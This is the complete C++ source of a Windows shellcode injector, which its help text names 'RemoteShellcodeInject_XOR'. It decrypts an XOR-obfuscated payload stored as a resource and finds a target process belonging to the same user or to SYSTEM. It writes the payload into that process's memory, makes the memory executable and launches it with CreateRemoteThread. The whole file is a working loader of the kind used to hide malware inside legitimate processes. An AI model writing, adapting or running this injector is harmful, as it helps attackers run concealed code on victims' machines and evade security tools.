#include <windows.h>
#define WIN32_LEAN_AND_MEAN
#include <TlHelp32.h>
#include <tchar.h>
#include "resource.h"
#include <comdef.h>
#include <string>
#include "Header.h"
#define MAX_NAME 256

void xor_decrypt(unsigned char* bytes, int data_len, char* key, int key_len)
{
	for (int i = 0; i < data_len; i++) {
		bytes[i] ^= key[i % key_len];
	}
}

DWORD ProcessID(const char* ProcessName, TCHAR* domain_current, TCHAR* user_current)
{
	DWORD pid;
	BOOL check = FALSE;

	//Create a snapshot of all running processes
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) return false;

	//Used to store the process info in the loop
	PROCESSENTRY32 ProcEntry;
	ProcEntry.dwSize = sizeof(PROCESSENTRY32);

	//Get the first process
	if (Process32First(hSnapshot, &ProcEntry)) {
		do
		{
			//If the found process name is equal to the one we're searching for
			if (!strcmp(ProcEntry.szExeFile, ProcessName))
			{
				if (!strcmp(user_current,"SYSTEM")) {
					pid = ProcEntry.th32ProcessID;
					CloseHandle(hSnapshot);
					check == TRUE;
					return ProcEntry.th32ProcessID;
				}
				else {
					//Before passing injection on, check if value of remote process (explorer.exe) is
					//the same user that ran binary
					pid = ProcEntry.th32ProcessID;
					check = GetUserFromRemoteProcess(pid, domain_current, user_current);
					//If true and user and domain match, clean up, pass value to break loop, reeturn PID
					if (check == TRUE) {
						CloseHandle(hSnapshot);
						//Return the processID of the found process
						return ProcEntry.th32ProcessID;
					}
					//If fail, stay in loop, and keep trying
					else {
						check = FALSE;
					}
				}
			}
		} while (Process32Next(hSnapshot, &ProcEntry) && check == FALSE); //Get the next process
	}
	CloseHandle(hSnapshot);
	//Since a process hasn't been found, return 0
	return 0;
}

BOOL GetLogonFromToken(HANDLE hToken, TCHAR* domain_current, TCHAR* user_current)
{
	DWORD dwSize = MAX_NAME;
	BOOL bSuccess;
	DWORD dwLength = 0;
	_bstr_t strUser = "";
	_bstr_t strdomain = "";
	PTOKEN_USER ptu = NULL;
	//Verify the parameter passed in is not NULL.
	if (NULL == hToken)
		goto Cleanup;

	if (!GetTokenInformation(
		hToken,         // handle to the access token
		TokenUser,    // get information about the token's groups 
		(LPVOID)ptu,   // pointer to PTOKEN_USER buffer
		0,              // size of buffer
		&dwLength       // receives required buffer size
	))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			goto Cleanup;

		ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(),
			HEAP_ZERO_MEMORY, dwLength);

		if (ptu == NULL)
			goto Cleanup;
	}

	if (!GetTokenInformation(
		hToken,         // handle to the access token
		TokenUser,    // get information about the token's groups 
		(LPVOID)ptu,   // pointer to PTOKEN_USER buffer
		dwLength,       // size of buffer
		&dwLength       // receives required buffer size
	))
	{
		goto Cleanup;
	}
	SID_NAME_USE SidType;
	char lpName[MAX_NAME];
	char lpDomain[MAX_NAME];

	if (!LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType))
	{
		DWORD dwResult = GetLastError();
		if (dwResult == ERROR_NONE_MAPPED)
			strcpy_s(lpName, "NONE_MAPPED");
		else
		{
			printf("LookupAccountSid Error %u\n", GetLastError());
		}
	}
	else
	{
		//printf("\nRemote user is  %s\\%s\n", lpDomain, lpName);
		//printf("Current user is %s\\%s\n", domain_current, user_current);
		strUser = lpName;
		strdomain = lpDomain;

		if (strcmp(strUser, user_current) == 0 && (strcmp(strdomain, domain_current) == 0)) {
			bSuccess = TRUE;
		}
		else {
			bSuccess = FALSE;
		}
	}

Cleanup:

	if (ptu != NULL)
		HeapFree(GetProcessHeap(), 0, (LPVOID)ptu);
	return bSuccess;
}

BOOL GetUserFromRemoteProcess(DWORD procId, TCHAR* domain_current, TCHAR* user_current)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, procId);
	if (hProcess == NULL)
		return E_FAIL;
	HANDLE hToken = NULL;

	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		CloseHandle(hProcess);
		return E_FAIL;
	}
	BOOL bres = GetLogonFromToken(hToken, domain_current, user_current);

	CloseHandle(hToken);
	CloseHandle(hProcess);
	return bres;
}

BOOL GetCurrentUserAndDomain(PTSTR szUser, PDWORD pcchUser, PTSTR szDomain, PDWORD pcchDomain) {
	//struct retVals {
		//char return_cUser, return_cDomain;
	//};

	BOOL         fSuccess = FALSE;
	HANDLE       hToken = NULL;
	PTOKEN_USER  ptiUser = NULL;
	DWORD        cbti = 0;
	SID_NAME_USE snu;

	__try {

		// Get the calling thread's access token.
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {

			if (GetLastError() != ERROR_NO_TOKEN)
				__leave;

			// Retry against process token if no thread token exists.
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
				__leave;
		}

		// Obtain the size of the user information in the token.
		if (GetTokenInformation(hToken, TokenUser, NULL, 0, &cbti)) {

			// Call should have failed due to zero-length buffer.
			__leave;

		}
		else {

			// Call should have failed due to zero-length buffer.
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
				__leave;
		}

		// Allocate buffer for user information in the token.
		ptiUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, cbti);
		if (!ptiUser)
			__leave;

		// Retrieve the user information from the token.
		if (!GetTokenInformation(hToken, TokenUser, ptiUser, cbti, &cbti))
			__leave;

		// Retrieve user name and domain name based on user's SID.
		if (!LookupAccountSid(NULL, ptiUser->User.Sid, szUser, pcchUser, szDomain, pcchDomain, &snu))
			__leave;

		fSuccess = TRUE;

	}
	__finally {

		// Free resources.
		if (hToken)
			CloseHandle(hToken);

		if (ptiUser)
			HeapFree(GetProcessHeap(), 0, ptiUser);
	}
	return fSuccess;
}

void GoForth(const char* process) {

	unsigned char* runMe;
	char key[] = "AA";

	//Make sure to set MAKERESOURCE(int) to whatever is specified in the resource.h file
	HRSRC res = FindResource(NULL, MAKEINTRESOURCE(102), RT_RCDATA);
	DWORD len = SizeofResource(NULL, res);
	HGLOBAL hResource = LoadResource(NULL, res);
	LPVOID lpAddress = LockResource(hResource);

	//Copy Resource file to memory space for mods
	unsigned char* bytes = (unsigned char*)malloc(len + 1);
	memcpy(bytes, lpAddress, len);

	//Convert XOR'd rsource file to char array (shellcode)
	xor_decrypt(bytes, len, key, strlen(key));

	//Set injection variables
	DWORD oldprotect = 0;
	LPVOID Memory;
	BOOL rv;

	//Set current process user variables
	TCHAR user_current[254], domain_current[254];
	DWORD szUser = sizeof(user_current), szDomain = sizeof(domain_current);

	//Get current user name and domain for future comparison
	GetCurrentUserAndDomain(user_current, &szUser, domain_current, &szDomain);

	//Get the ID of the process
	DWORD processID = ProcessID(process, domain_current, user_current);

	//Get a handle to the process
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);

	//Allocate space using handle to process, set permissions to RW
	Memory = VirtualAllocEx(hProcess, nullptr, len, MEM_COMMIT, PAGE_READWRITE);

	//Write to memory allocated
	WriteProcessMemory(hProcess, Memory, bytes, (SIZE_T)len, (SIZE_T*)NULL);

	//Set permissions back to read
	rv = VirtualProtectEx(hProcess, Memory, len, PAGE_EXECUTE, &oldprotect);

	//Yeet
	if (rv != 0) {
		HANDLE th = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)Memory, 0, 0, 0);
	}
}
void Helper() {
	printf("-----Remote Process Shellcode Injection Helper-----\n");
	printf("      ex: RemoteShellcodeInject_XOR [process]");
	exit(0);
}

int main(int argc, const char* argv[])
{
	if (argc != 2 || argv[1] == NULL) {
		Helper();
	}

	const char* process = argv[1];
	GoForth(process);
	return  0;
}